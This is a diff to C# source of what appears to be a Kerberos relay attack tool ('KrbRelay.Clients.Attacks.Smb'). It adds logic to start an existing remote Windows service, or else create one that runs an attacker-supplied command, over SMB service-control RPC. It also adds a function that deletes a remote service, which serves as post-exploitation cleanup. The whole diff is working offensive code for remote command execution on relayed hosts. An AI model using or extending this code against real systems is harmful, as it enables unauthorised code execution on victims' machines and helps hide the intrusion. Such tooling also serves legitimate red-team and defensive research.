@@ -82,7 +82,7 @@ namespace KrbRelay.Clients.Attacks.Smb
                     Console.WriteLine("[-] Could not bind to SCMR");
                     return false;
                 }
-
+                
                 var lpScHandle = ScmrServiceHelper.rOpenSCManagerW(rpc, out status);
                 if (status != NTStatus.STATUS_SUCCESS)
                 {
@@ -96,6 +96,7 @@ namespace KrbRelay.Clients.Attacks.Smb
                     Console.WriteLine("[-] Could not open service handle, wrong name?");
                     return false;
                 }
+                
 
                 ScmrServiceHelper.rChangeServiceConfig(rpc, serviceHandle, out NTStatus statusChange, startup);
                 if (statusChange != NTStatus.STATUS_SUCCESS)
@@ -138,6 +139,24 @@ namespace KrbRelay.Clients.Attacks.Smb
                     //Console.WriteLine("[-] Failed to open SCMR handle: {0}", status);
                     return String.Format("[-] Failed to open SCMR handle: {0}\r\n", status);
                 }
+                var serviceHandle = ScmrServiceHelper.rOpenServiceW(rpc, lpScHandle, serviceName, out status);
+                if (status == NTStatus.STATUS_SUCCESS)
+                {
+                    //ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out var temp);
+                    status = ScmrServiceHelper.rStartServiceW(rpc, serviceHandle);
+                    if (status != NTStatus.STATUS_SUCCESS)
+                    {
+                       //Console.WriteLine("[-] Service failed to start: {0} trying to create", status);
+                        //ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out var temp);
+                        // return String.Format("[-] Service failed to start: {0}\r\n", status);
+                    }
+                    else
+                    {
+                        //Console.WriteLine("[+] Service started {0} {0}", serviceName,cmd);
+                        return String.Format("[+] Service started {0} {0}\r\n", serviceName, cmd);
+                    }
+
+                }
                 var newHandle = ScmrServiceHelper.rCreateServiceW(rpc, lpScHandle, $"{serviceName}\x00", cmd, out status);
                 if (status != NTStatus.STATUS_SUCCESS)
                 {
@@ -162,6 +181,44 @@ namespace KrbRelay.Clients.Attacks.Smb
                 ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out status);
                 ScmrServiceHelper.rCloseServiceHandle(rpc, newHandle, out status);
             }
+        }
+        public static string serviceDelete(SMB2Client smb2, string serviceName)
+        {
+            using (RPCCallHelper rpc = new RPCCallHelper(smb2, ScmrService.ServicePipeName, ScmrService.ServiceInterfaceGuid, ScmrService.ServiceVersion))
+            {
+                var status = rpc.BindPipe();
+                if (status != NTStatus.STATUS_SUCCESS)
+                {
+                    return "[-] Could not bind to SCMR\r\n";
+                }
+
+                var lpScHandle = ScmrServiceHelper.rOpenSCManagerW(rpc, out status);
+                if (status != NTStatus.STATUS_SUCCESS)
+                {
+                    return String.Format("[-] Failed to open SCMR handle: {0}\r\n", status);
+                }
+
+                var serviceHandle = ScmrServiceHelper.rOpenServiceW(rpc, lpScHandle, serviceName, out status);
+                if (status != NTStatus.STATUS_SUCCESS)
+                {
+                    return String.Format("[-] Failed to open service: {0}\r\n", status);
+                }
+                NTStatus ntstatus = 0;
+               ntstatus=ScmrServiceHelper.rDeleteService(rpc, serviceHandle, out ntstatus);
+
+                ScmrServiceHelper.rCloseServiceHandle(rpc, serviceHandle, out status);
+                ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out status);
+
+                if (ntstatus != NTStatus.STATUS_SUCCESS)
+                {
+                    return String.Format("[-] Failed to delete service: {0}\r\n", ntstatus);
+                }
+                else
+                {
+                    return String.Format("[+] Service deleted: {0}\r\n", serviceName);
+                }
+            }
+            
         }
         public static string serviceStart(SMB2Client smb2, string serviceName)
         {
